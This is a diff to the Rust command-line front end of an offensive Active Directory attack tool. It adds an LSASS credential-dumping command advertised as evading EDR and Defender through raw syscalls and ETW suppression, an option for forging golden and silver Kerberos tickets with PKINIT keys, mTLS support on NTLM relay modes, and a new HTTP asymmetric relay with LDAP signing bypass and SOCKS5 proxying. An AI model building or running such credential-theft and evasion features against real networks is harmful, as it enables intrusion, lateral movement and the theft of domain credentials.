@@ -157,6 +157,11 @@ struct Cli {
     #[arg(long, global = true)]
     pkinit_key: Option<String>,
 
+    /// Use PKINIT-obtained TGT session key as the encryption key for forging
+    /// golden/silver tickets instead of requiring krbtgt hash
+    #[arg(long, global = true, default_value = "false")]
+    pkinit_keyed_ticket: bool,
+
     /// Path to TOML config file. Default: search XDG config dirs + CWD.
     #[arg(long, global = true, env = "OT_CONFIG")]
     config: Option<String>,
@@ -363,6 +368,22 @@ enum Commands {
         target: String,
         #[arg(value_enum)]
         source: DumpSource,
+    },
+
+    /// LSASS credential dumping — evasive in-process dump using raw syscalls (EDR/Defender bypass)
+    DumpLsass {
+        /// Output file path for the minidump (optional: memory-only if omitted)
+        #[arg(short, long)]
+        output: Option<String>,
+        /// Dump method: minidump (comsvcs.dll in-process) or direct (NtReadVirtualMemory page walk)
+        #[arg(value_enum, long, default_value = "auto")]
+        method: DumpLsassMethod,
+        /// LSASS process ID (auto-detected if not specified)
+        #[arg(long)]
+        pid: Option<u32>,
+        /// Skip ETW suppression
+        #[arg(long)]
+        no_etw_suppress: bool,
     },
 
     /// Environment diagnostics — check dependencies and connectivity
@@ -1613,6 +1634,16 @@ enum DumpSource {
     Dcc2,
 }
 
+#[derive(Debug, Clone, Copy, clap::ValueEnum)]
+enum DumpLsassMethod {
+    /// Auto-select: try MiniDump first, fall back to direct read
+    Auto,
+    /// In-process comsvcs.dll MiniDumpW (avoids rundll32.exe)
+    MiniDump,
+    /// Direct NtReadVirtualMemory page walk (no DLL loaded)
+    Direct,
+}
+
 // ──────────────────────────────────────────────────────────
 // NTLM relay sub-commands
 // ──────────────────────────────────────────────────────────
@@ -1660,6 +1691,12 @@ enum NtlmAction {
         /// Listener IP for coerced connections
         #[arg(long)]
         auto_coerce_listener: Option<String>,
+        /// mTLS client certificate PEM file path
+        #[arg(long)]
+        tls_client_cert: Option<String>,
+        /// mTLS client private key PEM file path
+        #[arg(long)]
+        tls_client_key: Option<String>,
     },
     /// NTLM relay via SMB protocol
     SmbRelay {
@@ -1684,6 +1721,12 @@ enum NtlmAction {
         /// Listener IP for coerced connections
         #[arg(long)]
         auto_coerce_listener: Option<String>,
+        /// mTLS client certificate PEM file path
+        #[arg(long)]
+        tls_client_cert: Option<String>,
+        /// mTLS client private key PEM file path
+        #[arg(long)]
+        tls_client_key: Option<String>,
     },
     /// NTLM relay via HTTP protocol
     HttpRelay {
@@ -1708,6 +1751,27 @@ enum NtlmAction {
         /// Listener IP for coerced connections
         #[arg(long)]
         auto_coerce_listener: Option<String>,
+        /// mTLS client certificate PEM file path
+        #[arg(long)]
+        tls_client_cert: Option<String>,
+        /// mTLS client private key PEM file path
+        #[arg(long)]
+        tls_client_key: Option<String>,
+    },
+    /// Enhanced HTTP asymmetric relay — full request capture and replay
+    HttpAsymmetric {
+        /// Target hosts for relay (e.g., smb://10.0.0.1:445, http://10.0.0.2:80)
+        #[arg(short, long, required = true, value_delimiter = ',')]
+        targets: Vec<String>,
+        /// HTTP listener port
+        #[arg(short, long, default_value = "80")]
+        port: u16,
+        /// Network interface to listen on
+        #[arg(short, long, default_value = "0.0.0.0")]
+        interface: String,
+        /// SOCKS5 proxy for outbound connections
+        #[arg(long)]
+        socks5_proxy: Option<String>,
     },
     /// NTLM relay via LDAP with GSS-SPNEGO bypass
     LdapRelay {
@@ -1729,6 +1793,12 @@ enum NtlmAction {
         /// Listener IP for coerced connections
         #[arg(long)]
         auto_coerce_listener: Option<String>,
+        /// mTLS client certificate PEM file path
+        #[arg(long)]
+        tls_client_cert: Option<String>,
+        /// mTLS client private key PEM file path
+        #[arg(long)]
+        tls_client_key: Option<String>,
     },
     /// Standalone SMB daemon for credential capture
     SmbDaemon {
@@ -1762,6 +1832,12 @@ enum NtlmAction {
         /// Exchange version
         #[arg(long, default_value = "2019")]
         version: String,
+        /// mTLS client certificate PEM file path
+        #[arg(long)]
+        tls_client_cert: Option<String>,
+        /// mTLS client private key PEM file path
+        #[arg(long)]
+        tls_client_key: Option<String>,
     },
 }
 
@@ -2294,6 +2370,15 @@ async fn async_main() -> i32 {
             ref target,
             ref source,
         } => commands_impl::cmd_dump(&cli, target, *source).await,
+        Commands::DumpLsass {
+            ref output,
+            method,
+            pid,
+            no_etw_suppress,
+        } => {
+            commands_impl::cmd_dump_lsass(&cli, output.as_deref(), method, pid, !no_etw_suppress)
+                .await
+        }
         Commands::Doctor {
             ref checks,
             ref target_dc,
@@ -3354,6 +3439,24 @@ async fn cmd_exploit(cli: &Cli, action: ExploitAction) -> i32 {
     }
 }
 
+/// Load mTLS identity from optional cert/key file paths.
+/// Returns `None` when both paths are `None`, or a loaded `TlsIdentity`
+/// when both are provided. Errors if only one is provided or file loading fails.
+fn load_tls_identity(
+    cert_path: Option<&str>,
+    key_path: Option<&str>,
+) -> Result<Option<overthrone_relay::relay::TlsIdentity>, String> {
+    match (cert_path, key_path) {
+        (Some(cert), Some(key)) => {
+            overthrone_relay::relay::TlsIdentity::load(cert, key)
+                .map(Some)
+        }
+        (Some(_), None) => Err("--tls-client-cert requires --tls-client-key".into()),
+        (None, Some(_)) => Err("--tls-client-key requires --tls-client-cert".into()),
+        (None, None) => Ok(None),
+    }
+}
+
 // cmd_ntlm
 #[cfg(feature = "relay")]
 async fn cmd_ntlm(action: NtlmAction) -> i32 {
@@ -3397,6 +3500,9 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 auto_coerce_listener: None,
                 socks5_proxy: None,
                 http_relay_config: None,
+                auto_coerce_parallel: false,
+                auto_coerce_mode: "all".to_string(),
+                auto_coerce_max_retries: 1,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3425,6 +3531,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             ldap_signing_bypass,
             auto_coerce_targets,
             auto_coerce_listener,
+            tls_client_cert,
+            tls_client_key,
         } => {
             println!(
                 "{} Starting NTLM relay to {} targets {}",
@@ -3432,6 +3540,14 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 targets.join(", ").cyan(),
                 if no_poison { "(relay-only)" } else { "" }
             );
+
+            let tls_identity = match load_tls_identity(tls_client_cert.as_deref(), tls_client_key.as_deref()) {
+                Ok(id) => id,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
 
             let relay_targets: Vec<RelayTarget> = targets
                 .iter()
@@ -3468,11 +3584,14 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison,
                 ldap_signing_bypass,
-                tls_client_identity: None,
+                tls_client_identity: tls_identity,
                 auto_coerce_targets,
                 auto_coerce_listener,
                 socks5_proxy: None,
                 http_relay_config: None,
+                auto_coerce_parallel: false,
+                auto_coerce_mode: "all".to_string(),
+                auto_coerce_max_retries: 1,
             };
 
             let mut controller = RelayController::new(config);
@@ -3504,12 +3623,23 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             ldap_signing_bypass,
             auto_coerce_targets,
             auto_coerce_listener,
+            tls_client_cert,
+            tls_client_key,
         } => {
             println!(
                 "{} Starting SMB relay to {} targets",
                 "dYZ_".bright_black(),
                 targets.join(", ").cyan()
             );
+
+            let tls_identity = match load_tls_identity(tls_client_cert.as_deref(), tls_client_key.as_deref()) {
+                Ok(id) => id,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+
             let relay_targets: Vec<RelayTarget> = targets
                 .iter()
                 .filter_map(|t| {
@@ -3537,11 +3667,14 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison: false,
                 ldap_signing_bypass,
-                tls_client_identity: None,
+                tls_client_identity: tls_identity,
                 auto_coerce_targets,
                 auto_coerce_listener,
                 socks5_proxy: None,
                 http_relay_config: None,
+                auto_coerce_parallel: false,
+                auto_coerce_mode: "all".to_string(),
+                auto_coerce_max_retries: 1,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3572,12 +3705,23 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             ldap_signing_bypass,
             auto_coerce_targets,
             auto_coerce_listener,
+            tls_client_cert,
+            tls_client_key,
         } => {
             println!(
                 "{} Starting HTTP relay to {} targets",
                 "dYZ_".bright_black(),
                 targets.join(", ").cyan()
             );
+
+            let tls_identity = match load_tls_identity(tls_client_cert.as_deref(), tls_client_key.as_deref()) {
+                Ok(id) => id,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+
             let relay_targets: Vec<RelayTarget> = targets
                 .iter()
                 .filter_map(|t| {
@@ -3609,11 +3753,14 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison: false,
                 ldap_signing_bypass,
-                tls_client_identity: None,
+                tls_client_identity: tls_identity,
                 auto_coerce_targets,
                 auto_coerce_listener,
                 socks5_proxy: None,
                 http_relay_config: None,
+                auto_coerce_parallel: false,
+                auto_coerce_mode: "all".to_string(),
+                auto_coerce_max_retries: 1,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3636,6 +3783,95 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 }
             }
         }
+        NtlmAction::HttpAsymmetric {
+            targets,
+            port,
+            interface,
+            socks5_proxy,
+        } => {
+            println!(
+                "{} Starting HTTP asymmetric relay on {}:{} with {} targets",
+                "dYZ_".bright_black(),
+                interface.cyan(),
+                port,
+                targets.len()
+            );
+
+            use overthrone_relay::http_asymmetric::{HttpAsymmetricConfig, HttpAsymmetricRelay};
+            use overthrone_relay::{Protocol, RelayTarget};
+            use std::net::SocketAddr;
+
+            let relay_targets: Vec<RelayTarget> = targets
+                .iter()
+                .filter_map(|t| {
+                    // Support protocol://host:port and host:port formats
+                    let (protocol_prefix, rest) = if let Some(idx) = t.find("://") {
+                        let proto = &t[..idx].to_lowercase();
+                        let rest = &t[idx + 3..];
+                        let protocol = match proto.as_str() {
+                            "smb" => Protocol::Smb,
+                            "http" => Protocol::Http,
+                            "https" => Protocol::Https,
+                            "ldap" => Protocol::Ldap,
+                            "ldaps" => Protocol::Ldaps,
+                            "mssql" => Protocol::Mssql,
+                            "msmq" => Protocol::Msmq,
+                            "exchange" => Protocol::Exchange,
+                            _ => return None,
+                        };
+                        (Some(protocol), rest)
+                    } else {
+                        (None, t.as_str())
+                    };
+                    let parts: Vec<&str> = rest.split(':').collect();
+                    let ip = parts[0].to_string();
+                    let port = parts.get(1).and_then(|p| p.parse().ok()).unwrap_or(match protocol_prefix {
+                        Some(Protocol::Smb) => 445,
+                        Some(Protocol::Https) => 443,
+                        Some(Protocol::Ldaps) => 636,
+                        Some(Protocol::Mssql) => 1433,
+                        Some(Protocol::Msmq) => 1801,
+                        _ => 80,
+                    });
+                    let addr: SocketAddr = format!("{}:{}", ip, port).parse().ok()?;
+                    let protocol = protocol_prefix.unwrap_or(match port {
+                        443 => Protocol::Https,
+                        445 => Protocol::Smb,
+                        389 | 636 => Protocol::Ldap,
+                        _ => Protocol::Smb,
+                    });
+                    Some(RelayTarget { address: addr, protocol, username: None })
+                })
+                .collect();
+
+            if relay_targets.is_empty() {
+                banner::print_fail("No valid relay targets specified");
+                return 1;
+            }
+
+            let config = HttpAsymmetricConfig {
+                listen_ip: interface.clone(),
+                listen_port: port,
+                targets: relay_targets,
+                socks5_proxy,
+                ldap_signing_bypass: true,
+                max_retries: 3,
+                timeout_secs: 30,
+            };
+            let mut relay = HttpAsymmetricRelay::new(config);
+            match relay.start().await {
+                Ok(_) => {
+                    banner::print_success("HTTP asymmetric relay started");
+                    tokio::signal::ctrl_c().await.unwrap();
+                    let _ = relay.stop().await;
+                    0
+                }
+                Err(e) => {
+                    banner::print_fail(&format!("HTTP asymmetric relay failed: {}", e));
+                    1
+                }
+            }
+        }
         NtlmAction::LdapRelay {
             target,
             port,
@@ -3643,7 +3879,17 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             no_signing_bypass,
             auto_coerce_targets,
             auto_coerce_listener,
+            tls_client_cert,
+            tls_client_key,
         } => {
+            let tls_identity = match load_tls_identity(tls_client_cert.as_deref(), tls_client_key.as_deref()) {
+                Ok(id) => id,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+
             let proto = if ldaps {
                 Protocol::Ldaps
             } else {
@@ -3686,11 +3932,14 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 downgrade_auth: false,
                 no_poison: false,
                 ldap_signing_bypass: !no_signing_bypass,
-                tls_client_identity: None,
+                tls_client_identity: tls_identity,
                 auto_coerce_targets,
                 auto_coerce_listener,
                 socks5_proxy: None,
                 http_relay_config: None,
+                auto_coerce_parallel: false,
+                auto_coerce_mode: "all".to_string(),
+                auto_coerce_max_retries: 1,
             };
             let mut controller = RelayController::new(config);
             match controller.initialize().await {
@@ -3766,6 +4015,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
             mapi_path,
             prefer_mapi,
             version,
+            tls_client_cert,
+            tls_client_key,
         } => {
             println!(
                 "{} Starting Exchange NTLM relay to {}{}",
@@ -3776,6 +4027,14 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
 
             use overthrone_relay::exchange::{ExchangeRelay, ExchangeRelayConfig};
 
+            let tls_identity = match load_tls_identity(tls_client_cert.as_deref(), tls_client_key.as_deref()) {
+                Ok(id) => id,
+                Err(e) => {
+                    banner::print_fail(&e);
+                    return 1;
+                }
+            };
+
             let config = ExchangeRelayConfig {
                 listen_ip: "0.0.0.0".into(),
                 target_host: target.clone(),
@@ -3784,6 +4043,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                 accept_self_signed: true,
                 ews_path: ews_path.clone(),
                 mapi_path: mapi_path.clone(),
+                autodiscover_path: "/autodiscover/autodiscover.xml".into(),
+                oab_path: "/oab/".into(),
                 prefer_mapi,
                 exchange_version: match version.to_lowercase().as_str() {
                     "2013" | "exchange2013" | "exchange 2013" => {
@@ -3801,6 +4062,8 @@ async fn cmd_ntlm(action: NtlmAction) -> i32 {
                     _ => overthrone_relay::exchange::ExchangeVersion::AutoDetect,
                 },
                 socks5_proxy: None,
+                endpoint_type: overthrone_relay::exchange::ExchangeEndpoint::Auto,
+                tls_client_identity: tls_identity,
             };
             let mut relay = ExchangeRelay::new(config);
             match relay.start().await {
